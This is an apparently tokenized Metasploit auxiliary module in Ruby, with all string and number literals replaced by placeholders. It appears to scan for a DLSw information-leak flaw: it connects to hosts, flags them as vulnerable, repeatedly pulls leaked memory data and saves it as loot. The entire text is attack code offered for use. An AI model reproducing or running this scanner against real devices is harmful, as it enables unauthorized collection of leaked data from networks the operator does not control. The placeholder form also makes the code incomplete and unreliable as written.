require <str> require <str> class Metasploit3 < Msf :: Auxiliary include Msf :: Exploit :: Remote :: Tcp include Msf :: Auxiliary :: Scanner include Msf :: Auxiliary :: Report def initialize super ( <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > <str> , <str> = > MSF_LICENSE ) register_options ( [ Opt :: RPORT ( <int> ) , OptInt . new ( <str> , [ true , <str> , <int> ] ) ] , self . class ) end def get_response ( size = <int> ) connect response = sock . get_once ( size ) disconnect response end def check_host ( _ip ) print_status ( <str> ) response = get_response if response . blank? vprint_status ( <str> ) Exploit :: CheckCode :: Safe elsif response [ <int> .. <int> ] == <str> || response [ <int> .. <int> ] == <str> vprint_good ( <str> ) report_service ( <str> : rhost , <str> : rport , <str> : <str> , name : <str> ) unless response [ <int> .. <int> ] . scan ( <str> ) . length == <int> print_good ( <str> response . length <str> ) report_vuln ( <str> : rhost , <str> : rport , name : name , <str> : references , <str> : <str> fullname <str> response . length <str> ) Exploit :: CheckCode :: Vulnerable end else vprint_status ( <str> response . size <str> ) Exploit :: CheckCode :: Safe end end def run_host ( ip ) return unless check_host ( ip ) == Exploit :: CheckCode :: Vulnerable dlsw_data = <str> until dlsw_data . length > datastore [ <str> ] response = get_response dlsw_data << response [ <int> .. <int> ] unless response . blank? end loot_and_report ( dlsw_data ) end def loot_and_report ( dlsw_leak ) path = store_loot ( <str> , <str> , rhost , dlsw_leak , <str> , <str> ) print_status ( <str> path <str> ) end end 
